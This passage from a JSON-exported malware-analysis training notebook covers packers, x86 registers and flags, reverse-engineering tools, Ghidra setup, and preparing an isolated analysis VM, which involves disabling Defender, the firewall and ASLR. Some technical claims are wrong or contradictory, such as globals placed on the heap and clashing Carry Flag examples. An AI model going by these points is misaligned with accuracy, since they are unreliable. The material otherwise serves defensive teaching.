causes structural changes to the executable file. This algorithm offers several significant advantages, including:\n\n\nMakes the executable file smaller in size.\n\n\nPrevents obtaining information about the file by static analysis using reverse engineering techniques.\n\n\nPrevents or makes detection by security products difficult.\n\n\nHow Does Unpacking Work?\nWhen an executable file is packed, it undergoes additional operations compared to an unpacked executable. These operations enable the packed file to execute successfully on the system. The following image illustrates this process step by step:\n\nThe process in the image above is briefly explained as follows:\n\n\nThe specific section highlighted in this stage is referred to as the entrypoint. It shows the initial step to be executed when the packed executable file is run. Due to the file being packed, the entrypoint points to the section containing the unpacker mechanism.\n\n\nAt this stage, unpacking is applied to the “Packed Executable” section using the unpacker.\n\n\nAt this stage, the “Original Unpacked Executable” resulting from the unpacking process in the previous stage is written to the empty section.\n\n\nDuring this stage, control of the program flow transitions from the unpacker to the original executable.\n\n\nFinally, the executable that has been successfully unpacked is executed.\n\n\nPackers\nA packer refers to a tool or algorithm utilized to execute the packing process. Nowadays, packers are primarily employed for secure source code. They are used by both software vendors and attackers. The user base of packers can vary depending on the type employed.\nThere are commercial packers as well as custom packers written by the attackers themselves. Some of these are open source. Some packers are shown in the image below:\n\nTypes of Packers\nCategorizing packers into specific types can be challenging because a single packer may serve multiple purposes, making clear classification difficult. However, the following classification is provided as it is considered to be the most suitable one:\nNote: It should be noted that a different classification may be included in another source. \nPackers may be divided into 3 groups: \n\n\nCompressing Packers\n\n\nEncrypting Packers(Crypters)\n\n\nProtecting Packers(Protectors)\n\n\nCompressing Packers\n “Compressing packers” are packers that reduce the size of an executable file.  In the past, these packers were commonly used to address limitations posed by slow internet speeds and limited storage capacity. However, currently, technology has reached a certain maturity and the size of executable files is no longer a significant concern.\nEncrypting Packers(Crypters)\nEncrypting packers (Crypters) are designed to encrypt the executable file, making it exceedingly challenging to extract information using static malware analysis techniques. Additionally, encrypting packers pose difficulties for security solutions in detecting malware. Malware developers frequently employ this type of packer to make their malware fully undetectable (FUD).\nProtecting Packers(Protectors)\nProtecting packers are a type of packer used by software developer vendors. With these packers, software vendors aim to prevent the source code of executable files of their products from being intercepted by reverse engineering techniques. These packers usually use both compressing algorithms and encryption algorithms.\nNote: Since packers are not strictly separated by their functions, an attacker can use a packer with both compressing and encryption capabilities as a packer to make the malware fully-undetectable (FUD). SOC analysts are recommended to take this into account when performing static malware analysis.\nHow to Identify Packers Automatically and Manually?\nWhen analyzing a malware statically, it is of great advantage to know whether packing operations have been applied or not. Because static analysis of a packed malware before it is unpacked provides almost no useful information about the executable file. Therefore, packed malware should be unpacked first. To achieve this, it is crucial to determine the packing algorithm employed. Both automatic and manual methods can be employed to detect the specific packing algorithm used. Automatic methods involve utilizing packer detection tools, while manual methods entail examining the file with the assistance of analysis tools. The automatic method is generally easier to apply and saves time. However, packer detection tools may not be effective in static analysis when dealing with malware that uses custom packers. In such cases, it becomes necessary to employ the manual method to understand the packing algorithm, which can be time-consuming and less desirable for SOC analysts.\nIn the headings below, automatic and manual methods are applied on the same malware and the packing algorithm used is determined.\nDetecting Packers with DIE(Detect It Easy)\nNumerous tools are available for determining the packer used in a malware sample. This tutorial utilizes the “DIE (Detect It Easy)” tool for packer detection. You can access the tool from the following address:\nDIE(Detect It Easy): github.com/horsicq/DIE-engine/releases \nOne packer detection tool may not detect every packer. Therefore, it is recommended to use more than one packer detection tool. Some packer detection tools are as follows:\n\nDIE(Detect It Easy)\nPEStudio\nCFF Explorer\nPEiD\nExeinfoPE\n\nFor instance, let’s find out which packer a malware is packed using the “DIE (Detect It Easy)” tool:\n\nUpon launching the DIE tool,  a window like the one above appears. The malware file is given to the program with the help of the button on the top right.\n\nAs demonstrated in the image above, the tool successfully detected the packer used to package the malware. Similar tools, including this one, employ signatures to identify specific packers during the detection process.\nNote: It would be more useful to perform the analysis considering that a packer may have more than one different signature. Packers may have varying signatures depending on their version.\nThere is a list of signatures of some packers in the address below.\nPacker Signature List: github.com/sooshie/packerid/blob/master/userdb.txt \nTo further illustrate the process, we can open the malware file in a hex editor called “HxD” and utilize its search feature to find the signature associated with the packer. \nSignature(Hex): 60 E8 03 00 00 00 E9 EB 04 5D 45 55 C3 E8 01 00 00 00 EB 5D BB ED FF FF FF 03 DD 81 EB\n\n\nAs seen in the image above, the signature we are looking for is located at 4201 offset.\nDetecting Packers Manually\nIn the previous topics, it is determined which packer packs the malware automatically and with the help of a tool. Under this title, a method that can be used to detect the packer manually is explained. In this method, we focus on the “Section Name” of the executable file. The table below presents the section names associated with several packers:\n\nIt is possible to find the packer by searching section names with static malware analysis tools. The following tools are available for this:\n\nPEview\nPE-bear\nStud_PE\n\nTo further investigate the malware that was identified using the automatic packer detection method mentioned earlier, we can analyze its sections using the PE-bear tool:\n\n In the image above, the malware file is opened with the PE-bear tool and its sections are displayed. Upon examining the section names, it is seen that there are section names specified for the “Aspack” packer in the table above. This indicates that the malware was indeed packed using the “Aspack” packer.\nNote: In this training module, section names have been utilized for manual packer detection. However, it is crucial to bear in mind that there are numerous other aspects within the malware that can be explored during manual packer detection. It is vital not to overlook the exploration of alternative areas if packer detection proves to be challenging or inconclusive.\nThis training section covers various aspects related to packing and unpacking, the benefits of packing, the operating logic of unpacking, different types of packers, and techniques for detecting packers manually and automatically. The subsequent part of the training delves into the topic of “Unpacking Packed Malware” which involves a practical application on malware."},"Malware-Analysis/Registers-1":{"slug":"Malware-Analysis/Registers-1","filePath":"Malware Analysis/Registers-1.md","title":"Registers-1","links":[],"tags":[],"content":"What is Register?\nRegisters are the variables in the assembly language. The size of each register in x86 architecture is 32 bits. Registers are located in the processor and each processor can have its own proprietary registers.\nGeneral Purpose Registers\nGeneral purpose registers can be divided into 3 subcategories:\n\n\nData Registers\n\n\nPointer Registers\n\n\nIndex Registers\n\n\n\nData Registers\nData registers are the ones that contain data.\nEAX (Accumulator Register)\nThe most basic register used in arithmetic operations is the “EAX” register. It stores the results of arithmetic operations and the return values of functions. For example, it is used for operations such as addition and multiplication.\nEBX (Base Register)\nIt is the register that holds the base address of the program.\nECX (Counter Register)\nThe “ECX” is the register that is used as counter. It is used in loop and string operations.\nEDX (Data Register)\nIt is a register that is generally used for holding data. It is also used in I/O (Input/Output) operations.\nPointer Registers\nPointer registers are the ones that hold memory addresses.\nEBP (Base Pointer)\nEBP is the one that holds the lowest address of the Stack and is used for local variables.\nESP (Stack Pointer)\nIt is the register that holds the top address of the stack. Displays the last element that entered the Stack.\nEIP (Instruction Pointer)\nThe EIP register may be the most important register as it holds the address of the next instruction to be executed in the program flow. In other words, if the value of this register is changed, the flow of the program can be interfered with.\nIndex Registers\nIndex registers are used for index information storage.\nESI (Source Index)\nIt is the register that holds the source index information for string operations. It holds the address of where the data will be read.\nEDI (Destination Index)\nIt is the register that holds the destination index information for string operations. It holds the address of where the data will be written."},"Malware-Analysis/Registers-2":{"slug":"Malware-Analysis/Registers-2","filePath":"Malware Analysis/Registers-2.md","title":"Registers-2","links":[],"tags":[],"content":"Segment Registers\nSegment registers are the registers used to hold addresses of specific segments in memory.\nStack Segment (SS)\nIt is the segment register that holds the base location address of the stack.\nCode Segment (CS)\nIt is the register which is known as “.text” and it holds the address of the code segment used for data access.\nData Segment (DS)\nIt is the register which is also known as “.data” and it holds the address of the data segment which is the default variable location for data access.\nExtra Segment (ES)\nIt is the register that holds the address of the extra segment used during string operations.\nEFLAGS Register - Status Flags\nThe EFLAGS register, unlike other registers, is a special register where each bit has a different meaning. The values of the bits of this register allow the CPU operations to be controlled and monitored.\nAdjust Flag (AF)\nIt is the flag that is set when there is a transfer from the 3rd bit to the 4th bit in arithmetic operations.\nCarry Flag (CF)\nIt is the flag that is set in arithmetic operations when the value of the register is more than the maximum value or if the value is less than the minimum value of the register. For example, the description over 4 bits is as follows:\nExample 1: \nInitially: “CF = 0”\n1111 + 0001 = 0000 (CF = 1)\n0000 - 0001 = 1111 (CF = 0)\nExample 2: \nInitially: “CF = 0”\n0000 - 0001 = 1111 (CF = 1)\nExample 3: \nInitially: “CF = 0”\n0111 + 0001 = 1000 (CF = 0)\n1000 - 0001 = 0111 (CF = 0)\nDirection Flag (DF)\nIt is the flag that determines the direction in the transport and comparison of string data. The string operation is performed from left to right in case of “DF = 0”, and from right to left in case of “DF = 1”.\nInterrupt Flag (IF)\nIt is the flag that determines whether external interruptions are taken into consideration and therefore it is the flag that determines whether the necessary operation is implemented. Keyboard entry would be a good example to the external interruption. Interruptions are ignored in case of “IF = 0” and considered disabled, and are applied to the process in case the “IF = 1” state.\nOverflow Flag (OF)\nThe overflow flag is set when a positive value for the signed integer is too large to be represented in the register, or when a negative value is too small.\nParity Flag (PF)\nIt is the flag that shows the total number of “1” bits in the results of arithmetic operations. If the total number of “1” bits is even, it becomes “PF = 1”. If the total number of “1” bits is odd, it becomes “PF = 0”.\nExample 1: \n10111100 + 00010001 = 11001101 (PF = 0)\nExample 2: \n10111100 + 00010000 = 11001100 (PF = 1)\nSign Flag (SF)\nIt is the flag that indicates whether the result of an arithmetic operation is negative or positive. If the result of the arithmetic operation takes a negative value, the sign flag is set as “SF = 1”. In case of a positive result, the sign flag will be in the state of “SF = 0”.\nTrap Flag (TF)\nIt is the flag that allows the processor to set the operating mode as single-step mode. The debugger program sets this flag to run each command one by one. In this way, each command executed by the processor at the assembly level can be executed step by step.\nZero Flag (ZF)\nIt is the flag set depending on whether the result of the arithmetic or the comparison operations is “0” (zero). If the result of the operation is “0”, then the  zero flag is set as “ZF = 1”. If the operation result is other than zero, then the zero flag is not set “ZF = 0”."},"Malware-Analysis/Resource-Analysis":{"slug":"Malware-Analysis/Resource-Analysis","filePath":"Malware Analysis/Resource Analysis.md","title":"Resource Analysis","links":[],"tags":[],"content":"What is Resource?\nResource refers to the assets that are contained within a Windows executable file and are used depending on the needs. For example, icons and images can be included as resources within a Windows executable.\nSignificance of Resource Analysis\nOne of the parts that can provide information about the behavior of a Windows malware is the section where resources are located. The malware may use another executable file as a resource. In this case, by learning the task performed by the executable file within the resources of the malware, insights about the malware’s behavior can be obtained.\nHow to Analyze Resources on Windows Executable\nThere are several tools available to view the resources within Windows executable files. One of these tools is “Resource Hacker.” Resource Hacker is a user-friendly tool with a graphical user interface (GUI). You can access the Resource Hacker tool at the following address:\nResource Hacker:  www.angusj.com/resourcehacker/ \nLet’s use this tool to view the resources of a file:\n\nWhen the Resource Hacker tool is first launched, it starts with a blank page as shown in the image above. With the “File → Open” option, the file whose resources are to be seen is imported into the program.\n\nAs seen in the image above, the resources belonging to the file are successfully listed.\nFollowing tools can also be used to see the resources:\n\nCFF Explorer: ntcore.com/ \nPE-Bear: github.com/hasherezade/pe-bear \nPE Studio: www.winitor.com/download\n"},"Malware-Analysis/Reverse-Engineering-Basics":{"slug":"Malware-Analysis/Reverse-Engineering-Basics","filePath":"Malware Analysis/Reverse Engineering Basics.md","title":"Reverse Engineering Basics","links":[],"tags":[],"content":"What is Reverse Engineering?\nReverse engineering is the analysis that helps determine what operations are the programs running when they started. This analysis is conducted while the executable files at the assembly code level (low level) are in operation or statically. Reverse engineering is mainly used for malware analysis within the cybersecurity industry.\n\nWhen Should the Reverse Engineering be Conducted and Why?\nMalware analysts must perform accurate analyses in order to use time efficiently as the reverse engineering is a time-consuming analysis process. For example, if mobile devices are not included in the assets within the organization, it would not be a coherent approach to perform mobile malware analysis. Instead, known malware types that may be a threat to existing assets within the organization should be analyzed. Alarms in the security products can be updated and additional measures can be taken according to the analysis reports. The important thing here is to reveal the attack methods of the current threats and take the necessary precautions, also to improve the monitoring and detection capability of the SOC team accordingly.\nThe Role of the Reverse Engineering in the Blue Team\nDifferent type of malware are the common ways to infect and seize the victim system nowadays and so reverse engineering is very important for the blue team as reverse engineering techniques are used to analyze the behavior of malwares. Since it is not usually possible to directly access the source code of the malware, we can only know or learn the behaviors and activities of the malware through reverse engineering techniques.\nCreating a Reverse Engineering Lab\nThe lab environment to be used for reverse engineering works and analyses are highly suggested to be virtual systems as we will examine malicious files mostly and would not want our systems to be infected with the malware that we are analyzing. The files to be analyzed in this training are files that are specifically created for this training class and do not have malicious elements. However, it is still recommended that the analysis environment be located on an isolated virtual operating system. It would be more appropriate to analyze the files in their own ecosystem in order for reverse engineering work to be carried out correctly and get the best results. For example, if a file with the extension “.exe” is to be analyzed, analysis should be performed with the Windows specific tools on a Windows operating system.\nTools to be Used in Reverse Engineering Lab\nFile Command\nThe file command is a basic command used to get information about files on Linux.\nObjdump\nObjdump is one of the tools that can be used for reverse engineering on the Linux command line.\nGCC\nGCC is a tool used to compile source codes of the C programming language on the Linux command line.\nGNU Debugger (GDB)\nGNU Debugger (GDB) is a tool on the Linux command line that allows to analyze files dynamically while they are running."},"Malware-Analysis/Reverse-Engineering":{"slug":"Malware-Analysis/Reverse-Engineering","filePath":"Malware Analysis/Reverse Engineering.md","title":"Reverse Engineering","links":["Malware-Analysis/Reverse-Engineering-Basics","Malware-Analysis/Basic-Concepts","Malware-Analysis/Memory-Layout","Malware-Analysis/Sample-C-Program","Malware-Analysis/C-Binary-Decompiling-with-Ghidra","Malware-Analysis/Registers-1","Malware-Analysis/Registers-2","Malware-Analysis/x86-Assembly","Malware-Analysis/CPU-Instructions","Malware-Analysis/GNU-Debugger-(GDB)","Malware-Analysis/Debugging-with-GDB"],"tags":[],"content":"Basics\n1. Reverse Engineering Basics\nWhat Reverse Engineering is, when and why reverse engineering techniques are used and its importance for blue team are explained.\n2. Basic Concepts\nThis topic covers the basic reverse engineering concepts that you will encounter while working on reverse engineering and practical examples about them.\n3. Memory Layout\nIt is important to have some foundational background information on how the basic computer hardware and software function in order to be able to work on reverse engineering. This topic covers the components of memory and their functioning.\n4. Sample C Program\nTo have a thorough understanding of C programming language is one of the most important steps to be able to start learning about reverse engineering because the C programming language is the system programming language that is closest to the assembly language, which is very similar to machine code, and it is the most appropriate and necessary programming language to be able to understand  the reverse engineering. This topic covers the C programming language as well as the Ghidra tool.\n5. C Binary Decompiling with Ghidra\nThis topic covers an example of decomplation in which a C Program is decompiled using Ghidra.\nIntermediates\n1. Registers-1\nThis topic covers some general purpose registers and their uses.\n2. Registers-2\nThis is continuation of earlier note and some special registers are discussed here.\n3. x86 Assembly\nThis topic discusses x86 assembly language syntax and addressing modes.\n4. CPU Instructions\nThis topic discusses various CPU instructions such as ADD, SUB, etc and Operation Codes.\n5. GNU Debugger (GDB)\nThis article contains info on how to install gdb  with a plugin on linux (debian systems) and basic usage of gdb.\n6. Debugging with GDB\nThis is an example showing GDB used in debugging a linux executable file."},"Malware-Analysis/Sample-C-Program":{"slug":"Malware-Analysis/Sample-C-Program","filePath":"Malware Analysis/Sample C Program.md","title":"Sample C Program","links":[],"tags":[],"content":"About the C Programming Language\nThe C programming language is one of the most popular programming languages that was created in the 1970s and has been widely used for many purposes since then. It is a programming language that is close to the operating system and to program it is relatively easier than the Assembly language. C is also one of programming languages that really helps understanding the reverse engineering. Therefore, the programs used for reverse engineering in this training were written in C programming language. It is necessary and would be helpful to have thorough knowledge of the programming language when conducting reverse engineering. For example, the functions are used as references during the analysis and being familiar to the function names of the programming language will definitely make a difference for us to be able to continue the analysis. The C programming language is very comprehensive and can even be the topic of its own training series. Basic knowledge of C programming language will be sufficient for this training.\nCompile Process\nA source code written in the C programming language goes through many intermediate stages while being compiled until it becomes an executable file. In this section, these steps are briefly mentioned. These stages are as follows:\n\n\nPre-processing\n\n\nCompilation\n\n\nAssembling\n\n\nLinking\n\n\n\nPre-processing\nA source code file with the extension “.c” is given to the pre-processing stage. At this stage, some preliminary preparations are applied on the source code to prepare for the compilation process. For example, deleting the comment lines in the source code is one of them. The file extension at this stage is “.i”.\nCompilation\nAt this stage, the code takes the form of assembly code. The file extension at this stage is “.s”.\nAssembling\nAt this stage, assembly code becomes machine code and is the last stage before it becomes an executable file. This state of the file is the “object” state. At this stage, the file extension is “.obj” or “.o”.\nLinking\nThe last stage before the executable file is created is the linking stage. This stage is very important in terms of its task because the linking of the libraries of the functions used in the program is performed at this stage. The object file created in the previous stage and the library files are combined to form the executable file. After this stage, the file extension becomes “.exe” for Windows systems. In Linux systems, it is in the form of “.out”, but since there is no file extension for executable files in Linux systems, output files can be created without the extension. At this file state, it is now ready to be run.\nCompiling C Source Code with GCC\nAfter briefly mentioning the compile process of the C programming language, let’s see how to compile the C source code with the “.c” extension using “GCC” in this section.\nFirst, type “Hello World!” on the command line. Let’s see the source code of the program that prints it:\n\nAs seen in the image above, a source code with a simple print operation was written in C programming language and saved as a “helloworld.c” file.\nNote: It usually comes pre-installed by default in “GCC” Linux distros, and it may need to be installed later in some Linux distros. For example, we will need to have it installed in the “Debian” used in this training as it is not installed in it. The following command can be used in Debian-based some Linux distros to install the GCC tool:\nInstall GCC: `sudo apt-get install gcc-multilib\nLet’s compile this source code with GCC:\n\nAs seen in the image above, GCC and C source code were successfully compiled and an executable file named “helloworld” was created. The meanings of the parameters in the command are as follows:\n-m32: This parameter allows compile to 32-bit systems. This parameter is required because 32-bit executable files are used in the training.\n-o: This is the parameter that gives the name of the file as output.\nCompile Command: `sudo gcc -m32 helloworld.c -o helloworld\nLet’s see the print operation by running the file:\n\nAs you can see in the image above, the file was successfully run.\nReviewing the C Source Code\nWe covered the stack and heap fields in the previous topics. We will exemplify the elements in the stack and heap area over the C code in this topic:\n\nAs can be seen in the image above, the status of the variables in the stack or heap can change depending on the fact that there are many different qualities in the C code. Variables named “a” and “y” defined as local variables are located in the stack area. Also, the variable named “x”, which is defined as the function parameter is another example for a variable in the stack area. On the other hand, “global_variable”, which is defined as a global variable is the example for the variables in the Heap field. In addition, the variable named “static_var”, which is defined as static, is also included in the heap area. Finally, another variable in the heap field is the variable named “z”, which is defined as an integer pointer. The reason why this variable is in the heap field is that the function named “malloc”, which is one of the dynamic allocation functions, is used. In addition to the malloc function, the C functions named calloc, free and realloc can be given as examples of functions used for dynamic memory allocation purposes.\nInstalling Ghidra Tool on Linux\nGhidra is an advanced reverse engineering tool that can be installed and used for free and available to everyone. Ghidra is a versatile tool where many reverse engineering operations can be conducted. One of its most important features is the decompile feature. Ghidra has a user friendly graphical user interface (GUI) and can run on both Windows and Linux.\nYou can access the Ghidra tool at the following link:\nGhidra: ghidra-sre.org/\nThe installation of the Ghidra tool is simply as follows:\n\nJDK 17 is required for the Ghidra tool to work, so JDK 17 must be downloaded and installed first:\nJDK 17 (64-Bit): adoptium.net/temurin/releases/ \n\nNote: Ghidra and JDK files are included in the Linux system, which is covered later in the training.\nAs seen in the image above, the 64-bit version of JDK 17 for Linux is downloaded. The downloaded compressed file with the extension “tar.gz” is extracted under any directory:\n\nAs you can see in the image above, the JDK file has been successfully extracted. After this process, “bin” directory that is in the JDK directory should be added to the path for ghidra to work. For this, a line must be added to the “.bashrc” file. For this, a line must be added to the “.bashrc” file.\nLet’s open this file under the home directory with the nano editor:\nCommand: `sudo nano ~/.bashrc\n\nThe red section in the image above shows the added line. The purple area in this section shows the bin directory location in the JDK.\nAdded Line: `export PATH=/home/letsdefend/reverse/jdk-17.0.5+8/bin:$PATH\nNote: The path part of the JDK file should be arranged in such a way that the full path should be the exact location of the JDK file.\nWe have installed the JDK successfully. The zip file of the Ghidra tool is downloaded and opened.\nCommand: `unzip ghidra_10.2.2_PUBLIC_20221115.zip\n\nAfter extracting the Ghidra zip file, the installation is completed. Running the underlined file in the image above will be enough to open the Ghidra tool."},"Malware-Analysis/Setting-up-Malware-Analysis-Lab":{"slug":"Malware-Analysis/Setting-up-Malware-Analysis-Lab","filePath":"Malware Analysis/Setting up Malware Analysis Lab.md","title":"Setting up Malware Analysis Lab","links":["Malware-Analysis/Malware-Analysis-Tools"],"tags":[],"content":"Creating a malware analysis lab\nInstalling Virtualization Software\nBefore installing a virtual operating system, we need to install one of the virtualization software that enables this.\nWhile there are some differences between them, any of the virtualization software will help us for our dynamic analysis. You can install one of the following virtualization software:\n\nVMware Workstation\nVMware Fusion (for macOS)\nOracle Virtualbox\n\nWe will use VMware Workstation virtualization software during the training and it is recommended for you to install it so that you can follow the training easily.\nYou can download and install VMware Workstation here.\nInstalling Operating System\nAfter installing the virtualization software on our system, let’s set up our operating system with the help of these virtualization software.\nIn order to install the operating system together with the virtualization software, we need to obtain the ISO files of the operating systems. You can use the application called MediaCreationTool published by Microsoft to create an ISO file for the Windows operating system.\nMalware may be programmed not to work or to behave differently depending on the operating system. For this reason, we strongly recommend that you have different operating systems at hand.\nWhen you run MediaCreationTool, you will be prompted with “Upgrade this PC now” and “Create installation media” options. Let’s continue by selecting the “Create installation media” option.\n\nThen we are asked to choose Language, operating system version information and operating system architecture. From here you can choose the Windows 10 64bit option. We recommend you to choose the operating system with 64bit architecture first. You can run both 32-bit applications and 64-bit applications on operating systems with 64-bit architecture, but you can only run 32-bit applications on operating systems with 32-bit architecture.\n\nAfter choosing the operating system version information and architecture, we are asked whether we want to write to the USB drive or create an ISO file. Since we need the ISO file, we choose the ISO option here.\n\nThen we are asked in which directory we want the ISO file to be saved. You may choose an appropriate directory for you.\nWhen you complete these steps, the ISO file will be saved in the directory you specified. (This step may take a long time.)\nNow that we have the ISO file, we can proceed to the installation of the operating system. Since VMware Workstation will be used in this training series, the lecture will be through this software. However, If you wish to use another virtualization software you should be able to adapt the lecture for other virtualization software easily since all these software are very similar.\nSince we are going to install a new operating system, we must first click on the “Create a New Virtual Machine” button. Alternatively, you can select “File” from the top menu and then “New Virtual Machine”.\n\nThen, we are asked to choose what kind of installation we want to proceed with. We continue our installation by choosing “Typical (recommended)”.\n\nWe select the ISO file that we have downloaded by selecting the “Installer disc image file (iso)” option.\n\nNext, we are asked to name the Virtual Machine and specify the directory that we want the files of the VM to be kept. You can use “Windows10 Dynamic Analysis” as the name and “the default directory” as the directory. We recommend giving it a descriptive name to your VM so that you won’t confuse your VMs if you have multiple. If you wish you can change this name you have given to the VM later.\n\nAfter choosing the name and the directory where the VM’s files will be kept, we are asked to determine the disk size of our operating system. Since we will install various software and applications in it, we recommend that you allocate a minimum of 60-70 GB.\n\nFinally, we are presented with some hardware settings that the operating system uses. At this stage, we go to the customization step by clicking the “Customize Hardware” button.\n\nSince we are using an operating system with a 64-bit architecture, I recommend reserving a minimum of 4 GB of RAM. If you assign lower settings you may end up with performance and operating system errors. However, if you are installing an operating system with a 32-bit architecture, then you may allocate less RAM.\n\nAfter we pass this stage, a Virtual Machine with the settings we specified is being created.\n\nAfter the VM is created, you can install the operating system normally by running the created VM.\nInstalling Tools and Software\nAt this point, our operating system is now ready for use. Next is the installation of tools and software that we will use during dynamic analysis.\nYou should install the tools we mentioned in our Malware Analysis Tools article on your virtual operating system now.\nTweaking Virtual Machine\nWe need to make some configuration changes on our Virtual Machine to be able to use it for malware analysis.\n1. Turn off anti-malware solutions\nSince we will analyze malware on our VM, we do not want antivirus software to delete the malware we have installed for analysis. We should turn off Windows Defender which comes active by default in Windows operating systems.\nYou should go to Windows Defender settings and disable all active settings. The feature that instantly scans and deletes the malware you have installed to analyze is “Real-time protection”. Make sure you turn this feature off.\n\nDisable Windows Defender Using Group Policy\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through “Search&gt;Run” function on Windows.\nTo disable Windows Defender using the Local Group Policy Editor application, you must access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Microsoft Defender Antivirus”\nHere, you should double-click the “Turn off Microsoft Defender Antivirus” policy and set it to “Enabled”.\n\nYou should also disable the “Monitor file and program activity on your computer” policy under “Real-time Protection”.\n\n2. Rename your virtual operating system\nSome malicious software makes various checks in order not to work in analysis environments. One of these checks is to check the hostname. Since most sandboxes have hostnames such as “Sandbox”, “Malware”, “Cuckoo” …, malware is programmed not to run on systems with these hostnames.\nYou should make your VM look like a normal user’s system as much as possible so that you can avoid anti-analysis techniques. Specifying a random name as the hostname will allow you to help avoid such checks.\nTo change the device name, you must select “Settings → System → About” and then click the “Rename this PC” button.\n\nDon’t forget to change your username too!\n3. Turn off auto updates\nThe malware we are going to analyze may be taking advantage of vulnerabilities in the operating system. In order for the malware to run as normally as possible, we need to turn off the automatic updates of our virtual operating system.\nYou can turn off automatic updates through the group policy settings.\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through the “Search&gt;Run” function on Windows.\nYou should then access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Update”\nAfter accessing the relevant policy, you should set the policy named “Configure Automatic Updates” to “Disabled”.\n\n4. Disable Hidden Extensions\nYou may have seen the attackers try to trick their victims by changing the file extensions. How could they do this?\nWindows operating systems are set to hide known file extensions by default. In other words, a file named “Chrome.exe” will appear as “Chrome” by default. Attackers name their malicious software as “Photo.jpg.exe”, causing the user to see the file as “Photo.jpg”. When the user thinks that this file is an image file and opens it, the malware will start to run.\nIn order not to get confused with this during our analysis, we need to fix it so that the extensions that are hidden by default are always shown.\nFor this, we need to open the application named “File Explorer” and access the settings menu by clicking the “File” and then “Change folder and search options” buttons from the top menu.\n\nThen you should save the settings by unchecking “Hide extensions for known file types” from the “View” tab.\n\n5. Show Hidden Files and Folders\nMalware aims to prevent the user from detecting their files by hiding them. By default, showing hidden files and directories will enable us to perform a more comfortable analysis.\nLet’s open the application called File Explorer and open the settings menu with the help of “File” from the top menu, then click “Change folder and search options”.\n\nThen, let’s check the “Show hidden files, folders, and drives” from the “View” tab and save the setting.\n\n6. Disable ASLR\nNew versions of Windows have an anti-exploit security mechanism called ASLR (Address Space Layout Randomization). We won’t get into ASLR too much in this training, but you may want to disable this feature at this stage as it will come up in the future.\nYou can disable this setting with the help of Registry. Access the following registry by opening the Registry Editor application.\n`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\n\nThen create a REG_DWORD type key named MoveImages.\nThese settings will eventually disable the ASLR feature.\n7. Disable Windows Firewall\nAs we implemented in the previous steps, we should disable the Windows Firewall to prevent the security mechanisms from interfering with the malicious software we analyze.\nAccess Windows Defender Firewall settings via the control panel. You can access these settings using the search bar in the top menu of File Explorer. If you copy and search the following path in this search bar, it will take you to the Windows Defender Firewall settings.\n“Control Panel\\System and Security\\Windows Defender Firewall\\Customize Settings”\n\nAfter accessing the Defender Firewall settings, select “Turn off Windows Defender Firewall” and save it. This will disable the Firewall.\n\n8. Mimic an End-User System\nYou should make your VM look like a normal end-user operating system as much as possible so that the malware you are analyzing is not caught by anti-analysis techniques.\nSince there are no precise instructions or settings for this, it’s totally up to you to make your analysis VM look like a normal end-user’s computer. We can recommend the following tips to implement on your VM to establish this similarity:\n\nInstalling browsers frequently preferred by end-users such as Chrome and Firefox,\nLeaving files in different directories that will be of interest to the attacker,\nChanging the desktop background,\nTo ensure that some files are found in the Downloads directory by downloading small applications through the browser\n\n9. Change Network Settings\nWe need to prevent our malware from spreading to different devices via network connection. Thanks to the private networks provided by virtualization software, we can prevent malware from infecting different devices.\nFor this, you must click on the “VM” menu in the top menu of VMware Workstation and select “Settings”.\nYou should select the “Custom” setting by selecting “Network Adapter” from the left menu in the window that opens.\n\nTake a Snapshot\nYour operating system may be affected functionally or become unusable after you analyze malware or ransomware on your system. When you want to analyze a new malware after running and analyzing another malware, you do not want your operating system to get affected by the changes that was made by the old malware you analyzed.\nIn such cases, you can take advantage of the Snapshot feature of virtualization software.\nSnapshot is a feature that allows you to take a snapshot of your Virtual Machine and return to this backup later.\nOur VM has been configured for malware analysis and the applications that we will be using in the analysis have been installed into it. At this stage, you can take a Snapshot and then switch to the same analysis environment with your clean VM.\nTo take snapshots, you can access the screen where you manage Snapshots by clicking the “VM” menu in the top menu of the VMware Workstation application and clicking “Snapshot” → “Snapshot Manager”.\nThen you can take a snapshot of your VM by clicking the “Take Snapshot” button. That’s how easy it is to take snapshots.\n\nEntering detailed information on the description will allow you to easily find the Snapshot you need. For this reason, we recommend that you enter as descriptive comments as possible."},"Malware-Analysis/Static-Malware-Analysis":{"slug":"Malware-Analysis/Static-Malware-Analysis","filePath":"Malware Analysis/Static Malware Analysis.md","title":"Static Malware Analysis","links":["Malware-Analysis/Unpacking-Malware","Malware-Analysis/Packers--and--Unpackers","Malware-Analysis/File-format-analysis","Malware-Analysis/Malware-Hash","Malware-Analysis/String-Analysis","Malware-Analysis/Analyzing-Imports--and--Exports","Malware-Analysis/Digital-Signature-Analysis","Malware-Analysis/Resource-Analysis"],"tags":[],"content":"Static analysis is the first step of malware analysis. Static analysis can reveal lots of details about malware and can be used as preliminary step before Dynamic Analysis.\nDifferent Analytics\n\nThe first step of static analysis is Unpacking Malware. For this one needs to understand what Packers &amp; Unpackers are.\nThe second analysis is File format analysis.\nWe can now calculate the Malware Hash. This will give us a  unique signature of malware which we can use to find reports in signature databases.\nWe can do String Analysis to gather info such as C2, file addresses, etc.\nThe next analytical method is Analyzing Imports &amp; Exports which can reveal further info about the malware.\nA simple Digital Signature Analysis can also reveal if the application is legit or not.\nResource Analysis can reveal assets utilized by the malware aiding in analysis.\n"},"Malware-Analysis/String-Analysis":{"slug":"Malware-Analysis/String-Analysis","filePath":"Malware Analysis/String Analysis.md","title":"String Analysis","links":[],"tags":[],"content":"What is a String?\nA string is a type of variable that is included in the source code of the software. This variable type consists of strings of characters which are usually made of meaningful words or groups of words. For example, the following C# source code contains variables of type string:\n\nSignificance of Strings Analysis\nExamining strings is of great importance in static malware analysis as valuable information about malware can be extracted from the strings. Here are some examples of the information that can be derived from:\n\n\nFile Names\n\n\nFile Paths\n\n\nIP Addresses\n\n\nDomain Names\n\n\nURL Addresses\n\n\nSecurity Product Names\n\n\nCrypto References\n\n\nWindows API Info\n\n\nBase64 Encoded Data\n\n\nFile Names\nStrings may contain the names of files targeted or used in the operating system. Knowing which file(s) on 